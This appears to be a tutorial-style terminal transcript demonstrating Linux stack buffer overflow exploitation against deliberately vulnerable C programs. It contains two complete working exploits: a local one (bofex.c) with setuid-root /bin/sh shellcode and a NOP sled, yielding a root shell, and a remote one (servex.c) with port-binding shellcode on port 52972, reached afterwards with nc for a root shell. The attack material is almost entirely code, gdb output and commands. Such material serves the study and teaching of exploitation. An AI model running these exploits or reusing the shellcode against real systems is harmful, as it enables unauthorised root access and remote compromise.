@@ -1,0 +1,407 @@
+Jeremy Brown [0xjbrown41@gmail.com/jbrownsec.blogspot.com]
+
+Stack Overflow Exploitation Demonstration [LINUX]
+
+[PART 1 + LOCAL][PART 1 + LOCAL][PART 1 + LOCAL][PART 1 + LOCAL][PART 1 + LOCAL][PART 1 + LOCAL]
+
+bugs@linux:~$ cat bof.c
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+
+char buf[1024];
+
+if(argc < 2) { printf("usage: %s data\n", argv[0]); return 0; }
+
+     sprintf(buf, "%s", argv[1]);
+     printf("\n%s\n\n", buf);
+
+return 0;
+}
+bugs@linux:~$ gcc -o bof bof.c
+bugs@linux:~$ ./bof
+usage: ./bof data
+bugs@linux:~$ gdb bof
+GNU gdb 6.1.1
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i486-linux-linux"...Using host libthread_db library "/lib/libthread_db.so.1".
+
+(gdb) r `perl -e 'print "A" x 1040'`
+Starting program: /home/bugs/bof `perl -e 'print "A" x 1040'`
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.....
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) i r
+eax            0x0	0
+ecx            0x0	0
+edx            0x413	1043
+ebx            0x4015760c	1075148300
+esp            0xbffff360	0xbffff360
+ebp            0x41414141	0x41414141
+esi            0x40014900	1073826048
+edi            0xbffff3a4	-1073744988
+eip            0x41414141	0x41414141
+eflags         0x10282	66178
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x0	0
+(gdb) q
+The program is running.  Exit anyway? (y or n) y
+bugs@linux:~$ cat bofex.c
+#include <stdio.h>
+
+#define RETADDR 0x41424344 // return address to hit nop slide + shellcode
+
+char shellcode[] = "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x50"
+		   "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
+		   "\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+
+int main(int argc, char *argv[])
+{
+
+if(argc < 3) { printf("Usage: %s prog size\n", argv[0]); return 0; }
+
+     char *ptr, *prog = argv[1];
+     int i, size = atoi(argv[2]);
+     long *addr_ptr;
+
+     char buffer[size];
+     ptr = buffer;
+     addr_ptr = (long *)ptr;
+
+for(i = 0; i < size; i += 4)
+     *(addr_ptr++) = RETADDR; // put the return address in our exploit buffer
+
+for(i = 0; i < size / 2; i++)
+     buffer[i] = '\x90';         // fill around half of the buffer with NOPs
+
+     ptr = buffer + ((size / 2) - (strlen(shellcode) / 2));
+
+for(i = 0; i < strlen(shellcode); i++)
+     *(ptr++) = shellcode[i]; // here comes the shellcode
+
+     execl(prog, prog, buffer, 0); // smash the stack
+
+return 0;
+}
+
+bugs@linux:~$ gcc -o bofex bofex.c
+bugs@linux:~$ gdb bofex
+GNU gdb 6.1.1
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i486-linux-linux"...Using host libthread_db library "/lib/libthread_db.so.1".
+
+(gdb) r /home/bugs/bof 1040
+Starting program: /home/bugs/bofex /home/bugs/bof 1040
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x40000b20 in ?? () from /lib/ld-linux.so.2
+(gdb) c
+Continuing.
+
+..... //shh/bin ..... DCBADCBADCBADCBADCBADCBADCBADCBADCBADCBADCBADCBADCBADCBADCBA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41424344 in ?? ()
+(gdb) i r
+eax            0x0	0
+ecx            0x0	0
+edx            0x429	1065
+ebx            0x4015760c	1075148300
+esp            0xbffff340	0xbffff340
+ebp            0x41424344	0x41424344
+esi            0x40014900	1073826048
+edi            0xbffff384	-1073745020
+eip            0x41424344	0x41424344
+eflags         0x10282	66178
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x0	0
+(gdb) x/100x $esp-800
+0xbffff020:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff030:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff040:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff050:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff060:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff070:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff080:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff090:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff0a0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff0b0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff0c0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff0d0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff0e0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff0f0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff100:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff110:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff120:	0x90909090	0x90909090	0xdb31c031	0x80cd17b0
+0xbffff130:	0x6850c031	0x68732f2f	0x69622f68	0x50e3896e
+0xbffff140:	0x99e18953	0x80cd0bb0	0x41424344	0x41424344
+0xbffff150:	0x41424344	0x41424344	0x41424344	0x41424344
+0xbffff160:	0x41424344	0x41424344	0x41424344	0x41424344
+0xbffff170:	0x41424344	0x41424344	0x41424344	0x41424344
+0xbffff180:	0x41424344	0x41424344	0x41424344	0x41424344
+0xbffff190:	0x41424344	0x41424344	0x41424344	0x41424344
+0xbffff1a0:	0x41424344	0x41424344	0x41424344	0x41424344
+(gdb) q
+The program is running.  Exit anyway? (y or n) y
+bugs@linux:~$ grep RETADDR bofex.c
+#define RETADDR 0x41424344 // return address to hit nop slide + shellcode
+     *(addr_ptr++) = RETADDR; // put the return address in our exploit buffer
+bugs@linux:~$ pico bofex.c
+bugs@linux:~$ grep RETADDR bofex.c
+#define RETADDR 0xbffff0e0 // return address to hit nop slide + shellcode
+     *(addr_ptr++) = RETADDR; // put the return address in our exploit buffer
+bugs@linux:~$ gcc -o bofex bofex.c
+bugs@linux:~$ ./bofex
+Usage: ./bofex prog size
+bugs@linux:~$ ./bofex /home/bugs/bof 1040
+
+..... //shh/bin .....
+
+sh-2.05b# id
+uid=0(root) gid=100(users) groups=100(users)
+sh-2.05b# exit
+exit
+bugs@linux:~$
+
+[PART 2 + REMOTE][PART 2 + REMOTE][PART 2 + REMOTE][PART 2 + REMOTE][PART 2 + REMOTE][PART 2 + REMOTE]
+
+(Terminal #1)
+
+bugs@linux:~$ cat serv.c
+#include <stdio.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+
+#define BUFFSZ 1024
+#define READSZ 2048
+
+int main(int argc, char *argv[])
+{
+
+if(argc < 2) { printf("Usage: %s port\n", argv[0]); return 0; }
+
+     int z, cli, serv, port = atoi(argv[1]);
+
+     struct sockaddr_in client, server;
+
+     server.sin_family      = AF_INET;
+     server.sin_port        = htons(port);
+     server.sin_addr.s_addr = INADDR_ANY;
+
+if((serv = socket(AF_INET, SOCK_STREAM, 0)) == -1) { printf("Error: socket()\n"); return -1; }
+
+if(bind(serv, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) { printf("Error: bind()\n"); return -1; }
+
+if(listen(serv, 10) == -1) { printf("Error: listen()\n"); return -1; }
+
+for(;;)
+{
+
+     cli = accept(serv, (struct sockaddr *)&client, &z);
+
+if(vulnerable(cli) == -1) { printf("Error: vulnerable()\n"); close(cli); }
+
+}
+
+     return 0;
+}
+
+int vulnerable(int sock)
+{
+
+     char buffer[BUFFSZ], readbuf[READSZ];
+
+     memset(buffer,  0, BUFFSZ);
+     memset(readbuf, 0, READSZ);
+
+     read(sock, readbuf, READSZ, 0);
+
+     sprintf(buffer, "%s", readbuf);  // we smash the stack here
+
+     send(sock, buffer, BUFFSZ, 0);
+
+     close(sock);
+
+}
+
+bugs@linux:~$ gcc -o serv serv.c
+bugs@linux:~$ ./serv
+Usage: ./serv port
+bugs@linux:~$ gdb serv   
+GNU gdb 6.5
+Copyright (C) 2006 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i486-linux-linux"...Using host libthread_db library "/lib/libthread_db.so.1".
+
+(gdb) r 5555
+Starting program: /home/bugs/serv 5555
+
+(Terminal #2)
+
+bugs@linux:~$ cat servex.c
+#include <stdio.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+
+#define RETADDR 0x41424344 // return address to hit nop slide + shellcode
+
+char shellcode[] = /* Linux Portbind @ 52972 */
+		   "\x6a\x66\x58\x6a\x01\x5b\x99\x52\x53\x6a\x02\x89"
+		   "\xe1\xcd\x80\x52\x43\x68\xff\x02\xce\xec\x89\xe1"
+		   "\x6a\x10\x51\x50\x89\xe1\x89\xc6\xb0\x66\xcd\x80"
+		   "\x43\x43\xb0\x66\xcd\x80\x52\x56\x89\xe1\x43\xb0"
+		   "\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80"
+		   "\x41\xe2\xf8\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
+		   "\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+int main(int argc, char *argv[])
+{
+
+if(argc < 4) { printf("Usage: %s host port size\n", argv[0]); return 0; }
+
+     char *ptr, *host = argv[1];
+     int i, len, sock, port = atoi(argv[2]), size = atoi(argv[3]);
+     long *addr_ptr;
+
+     char buffer[size];
+     ptr = buffer;
+     addr_ptr = (long *)ptr;
+
+     struct sockaddr_in target;
+
+for(i = 0; i < size; i += 4)
+     *(addr_ptr++) = RETADDR; // put the return address in our exploit buffer
+
+for(i = 0; i < size / 2; i++)
+     buffer[i] = '\x90';         // fill around half of the buffer with NOPs
+
+     ptr = buffer + ((size / 2) - (strlen(shellcode) / 2));
+
+for(i = 0; i < strlen(shellcode); i++)
+     *(ptr++) = shellcode[i]; // here comes the shellcode
+
+     len = strlen(buffer);
+
+     target.sin_family      = AF_INET;
+     target.sin_port        = htons(port);
+     target.sin_addr.s_addr = inet_addr(host);
+
+if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) { printf("Error: socket()\n"); return -1; }
+
+if(connect(sock, (struct sockaddr *)&target, sizeof(struct sockaddr)) == -1) { printf("Error: connect()\n"); return -1; }
+
+     send(sock, buffer, len, 0);
+
+     return 0;
+}
+
+bugs@linux:~$ gcc -o servex servex.c
+bugs@linux:~$ ./servex
+Usage: ./servex host port size
+bugs@linux:~$ ./servex 127.0.0.1 5555 1040
+
+(Terminal #1)
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41424344 in ?? ()
+(gdb) i r
+eax            0xffffffff	-1
+ecx            0x9	9
+edx            0x4000baa0	1073789600
+ebx            0x4015bff0	1075167216
+esp            0xbffff570	0xbffff570
+ebp            0x41424344	0x41424344
+esi            0xbffff630	-1073744336
+edi            0x2	2
+eip            0x41424344	0x41424344
+eflags         0x10286	[ PF SF IF RF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x0	0
+(gdb) x/100x $esp-800
+0xbffff250:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff260:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff270:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff280:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff290:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff2a0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff2b0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff2c0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff2d0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff2e0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff2f0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff300:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff310:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff320:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff330:	0x90909090	0x90909090	0x90909090	0x666a9090
+0xbffff340:	0x5b016a58	0x6a535299	0xcde18902	0x68435280
+0xbffff350:	0xecce02ff	0x106ae189	0xe1895051	0x66b0c689
+0xbffff360:	0x434380cd	0x80cd66b0	0xe1895652	0xcd66b043
+0xbffff370:	0x89d98980	0x493fb0c3	0xe24180cd	0x6e6852f8
+0xbffff380:	0x6868732f	0x69622f2f	0x5352e389	0x0bb0e189
+0xbffff390:	0x414280cd	0x41424344	0x41424344	0x41424344
+0xbffff3a0:	0x41424344	0x41424344	0x41424344	0x41424344
+0xbffff3b0:	0x41424344	0x41424344	0x41424344	0x41424344
+0xbffff3c0:	0x41424344	0x41424344	0x41424344	0x41424344
+0xbffff3d0:	0x41424344	0x41424344	0x41424344	0x41424344
+(gdb) q
+The program is running.  Exit anyway? (y or n) y
+root@linux:~# ./serv 5555
+
+(Terminal #2)
+
+bugs@linux:~$ grep RETADDR servex.c
+#define RETADDR 0x41424344 // return address to hit nop slide + shellcode
+     *(addr_ptr++) = RETADDR; // put the return address in our exploit buffer
+bugs@linux:~$ pico servex.c
+bugs@linux:~$ grep RETADDR servex.c
+#define RETADDR 0xbffff250 // return address to hit nop slide + shellcode
+     *(addr_ptr++) = RETADDR; // put the return address in our exploit buffer
+bugs@linux:~$ gcc -o servex servex.c
+bugs@linux:~$ netstat -antp | grep serv
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (servers and established)
+tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN     2256/serv           
+bugs@linux:~$ ./servex 127.0.0.1 5555 1040
+bugs@linux:~$ netstat -antp | grep serv
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (servers and established)
+tcp        0      0 0.0.0.0:52972           0.0.0.0:*               LISTEN     2256/serv           
+tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN     2256/serv           
+tcp        1      0 127.0.0.1:5555          127.0.0.1:32834         CLOSE_WAIT 2256/serv           
+bugs@linux:~$ nc localhost 52972
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+exit
+bugs@linux:~$
+
+Questions. Comments. Concerns. --> 0xjbrown41@gmail.com
